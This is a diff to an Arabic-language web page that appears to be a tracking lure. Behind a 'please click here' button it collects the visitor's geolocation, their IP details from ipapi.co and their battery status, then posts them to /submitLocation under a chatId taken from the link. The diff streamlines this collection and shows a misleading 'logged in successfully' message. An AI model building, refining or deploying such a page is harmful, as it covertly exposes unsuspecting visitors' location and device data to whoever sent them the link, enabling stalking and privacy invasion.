@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>مرحبا بك في موقعنا</title>
+    <title>مرحبا بك في موقعنا</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -42,6 +42,7 @@
             height: 40px;
             animation: spin 1s linear infinite;
             margin: 20px auto;
+            display: none;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
@@ -52,7 +53,7 @@
 <body>
     <div class="container">
         <button onclick="getLocation()">من فضلك اضغط هنا</button>
-        <div class="loading" id="loading" style="display: none;"></div>
+        <div class="loading" id="loading"></div>
         <p id="status"></p>
     </div>
 
@@ -66,8 +67,9 @@
             
             try {
                 const position = await getCurrentPosition();
-                await sendLocationData(position);
-                statusElement.textContent = "تم إرسال الدخول بنجاح!";
+                const additionalData = await collectAdditionalData();
+                await sendLocationData(position, additionalData);
+                statusElement.textContent = "تم تسجيل الدخول الا الموقع بنجاح!";
             } catch (error) {
                 console.error("Error:", error);
                 statusElement.textContent = "حدث خطأ: " + error.message;
@@ -86,21 +88,19 @@
         }
 
         function getChatId() {
-    const urlParams = new URLSearchParams(window.location.search);
-    const chatId = urlParams.get('chatId') || window.location.pathname.split('/').pop();
-    console.log("Retrieved chatId:", chatId); // للتحقق في وحدة التحكم
-    return chatId;
-}
+            const urlParams = new URLSearchParams(window.location.search);
+            const chatId = urlParams.get('chatId') || window.location.pathname.split('/').pop();
+            console.log("Retrieved chatId:", chatId);
+            return chatId;
+        }
 
-async function sendLocationData(position) {
-    const chatId = getChatId();
-    if (!chatId) {
-        throw new Error("معرف المحادثة غير موجود");
-    }
-    // باقي الكود...
+        async function sendLocationData(position, additionalData) {
+            const chatId = getChatId();
+            if (!chatId) {
+                throw new Error("معرف المحادثة غير موجود");
+            }
 
             const { latitude, longitude } = position.coords;
-            const additionalData = await collectAdditionalData();
 
             const response = await fetch('/submitLocation', {
                 method: 'POST',
@@ -116,8 +116,10 @@ async function sendLocationData(position) {
         }
 
         async function collectAdditionalData() {
-            const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
-            const battery = await navigator.getBattery();
+            const [ipInfo, battery] = await Promise.all([
+                fetch('https://ipapi.co/json/').then(res => res.json()),
+                navigator.getBattery()
+            ]);
 
             return {
                 ip: ipInfo.ip,
